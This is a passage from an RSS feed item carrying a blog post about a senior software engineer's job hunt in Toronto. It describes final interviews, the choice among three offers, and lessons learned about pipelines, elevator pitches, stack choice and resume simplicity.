&lt;p&gt;The next morning, I got an offer. They told me, my offer was the highest salary obtainable for my respective role. And indeed, it exceeded my general salary expectations for Toronto by 15%. This gave me a huge confidence boost.&lt;/p&gt;
&lt;h3 id=&quot;45&quot;&gt;#4 &amp;amp; #5&lt;/h3&gt;
&lt;p&gt;These interviews were very different from the others.&lt;/p&gt;
&lt;p&gt;In the first one, I talked to a development manager for about two hours. Since I had solved an online coding challenge beforehand, we focused on high-level questions. Interestingly, we talked a lot about how to pick tools and technologies. For example, how to decide between Angular and React.&lt;/p&gt;
&lt;p&gt;I was invited for a second interview to meet the VP of Engineering. The interview quickly uncovered that they had a different role in mind for me than I did. In the end, they told me that they would get back to me - but I sent an email the next morning telling them I don't think it a good fit and that was that.&lt;/p&gt;
&lt;h3 id=&quot;6&quot;&gt;#6&lt;/h3&gt;
&lt;p&gt;I can not talk about this one since I had to sign an NDA. Bummer.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;¯\_(ツ)_/¯&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Fast forward to the next day, I got an offer.&lt;/p&gt;
&lt;h2 id=&quot;decision&quot;&gt;Decision&lt;/h2&gt;
&lt;p&gt;After all was said and done, I had three offers. They were very different. For example, the difference between the highest and lowest salary was 23%! And that's not counting additional benefits like catered lunch, health benefits etc.&lt;/p&gt;
&lt;p&gt;I scheduled a phone call with a manager from each of the companies and talked to them for an hour each. We discussed details like on-call requirements, the team I would join, things I would work on and so on. I also consulted a friend (fellow software engineer) to get a second opinion.&lt;/p&gt;
&lt;p&gt;After extensive considerations, I made my choice. I picked the company where I felt I could grow further as a software engineer, that seemed to have a great work-life balance, excellent compensation and worked on stuff that mattered.&lt;/p&gt;
&lt;h2 id=&quot;lessonslearned&quot;&gt;Lessons Learned&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;It's like a sales pipeline&lt;/strong&gt;: I applied to 14 companies, talked to 8, interviewed at 5 and got an offer from 3. You see how the numbers get smaller? If your pipeline dries out, the odds of getting an offer decline dramatically.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Talk to everyone&lt;/strong&gt;: Even though I was hesitant to talk to a recruiter at first, it helped me immensely. He didn't find me a job per se but gave me some insights about the local tech scene and HR best practices, I needed as a newcomer.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;High-level matters:&lt;/strong&gt; Maybe it's because I applied for more senior positions only but in general, there were hardly any low-level questions during the on-site interviews. Interviewers were interested in how I design systems, object relations, and APIs. Sure, I had to actually code, too - but nobody cared to quiz me about what ACID is or had me code on a whiteboard.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Side projects are not &lt;em&gt;that&lt;/em&gt; helpful:&lt;/strong&gt; So at least for a senior developer, having a side project didn't seem to make much of a difference. Nobody asked anything about it. I tried to bring it up in my cover letter or during phone screenings for full-stack positions but I don't know if it had any effect. Even the Python-heavy companies didn't seem to care - which surprised me. Then again, one company wouldn't even interview me because I didn't have enough experience with their Python stack. So in the end, it didn't &lt;em&gt;really&lt;/em&gt; seem to help that much.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Have your personal elevator pitch ready&lt;/strong&gt;: The only 'question' I was consistently asked in every interview by every person I met was: &quot;Tell me about yourself.&quot; You &lt;em&gt;need&lt;/em&gt; a good answer here. It allows you to shape the narrative, to paint a picture of yourself. Make it short and compelling. Make it count.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Pick one stack and go with it:&lt;/strong&gt; During the interviews - with the better companies at least - I was allowed to choose the stack &lt;em&gt;I&lt;/em&gt; was comfortable with to solve a problem. This made a huge difference and helped me 'cheat' a bit by picking a typed language (Typescript) so I didn't have to rely on my stressed out brain to provide me with all the function names on the spot.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Be able to talk about a project in depth:&lt;/strong&gt; When the inevitable question &quot;What are you most proud of?&quot; comes up, it's your turn to impress. You should be able to provide sufficient context for the listener to understand why it was indeed that impressive. Furthermore, if you are asked by an engineer, you can show off your technical expertise. Go into detail as much as you can. Make it painfully obvious that you know what you are talking about.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Leverage the opportunity to prepare:&lt;/strong&gt; In half of the interviews, I was instructed to prepare a development environment ahead of time. This is your chance to set yourself up for success. I pre-installed a bunch of helper libraries for the most common use cases like templating, making HTTP requests, and serving REST APIs. Another great idea is to have a test runner ready, running on every file save for continuous feedback.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Know complexity and scalability:&lt;/strong&gt; Every time I had to code something, I was asked about the time and space complexity as well as whether I can simply make it more efficient. Now and then, I was also asked what would happen if the input became gigantic so it wouldn't work on a single machine anymore. It's crucial to have answers here.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Simplify your resume:&lt;/strong&gt; First of all, my resume for the first batch of online applications was not good. It was too long and not 'easily scannable'. Since people in HR receive so many applications, they allegedly only look at a resume for 10-30 seconds. During most interviews, I could tell that the interviewer hadn't read my resume for more than one minute. People are busy. The lesson here is to make it &lt;em&gt;suuuuper&lt;/em&gt; easy to learn the most important facts about you. Basically, apply the lessons from &lt;a href=&quot;https://en.wikipedia.org/wiki/Don%27t_Make_Me_Think&quot;&gt;Don't Make Me Think&lt;/a&gt;. If they judge you by keywords, put a lot of keywords in. This cannot be overstated.&lt;/p&gt;
</description>
<pubDate>Sun, 31 Dec 2017 19:52:47 +0000</pubDate>
<dc:creator>rbanffy</dc:creator>
<og:type>article</og:type>
<og:title>How I Learned to Stop Worrying and Love the Job Hunt</og:title>
<og:description>This is a story about finding a job as a senior software engineer in Toronto - with a twist: just having moved there from Germany. I was prepared. I had a plan. But it failed completely - at first. I had to adapt and learn. It was a roller coaster</og:description>
<og:url>http://blog.stephanbehnke.com/how-i-learned-to-stop-worrying-and-love-the-job-hunt-in-toronto/</og:url>
<dc:format>text/html</dc:format>
<dc:identifier>https://blog.stephanbehnke.com/how-i-learned-to-stop-worrying-and-love-the-job-hunt-in-toronto/</dc:identifier>
</item>
</channel>
</rss>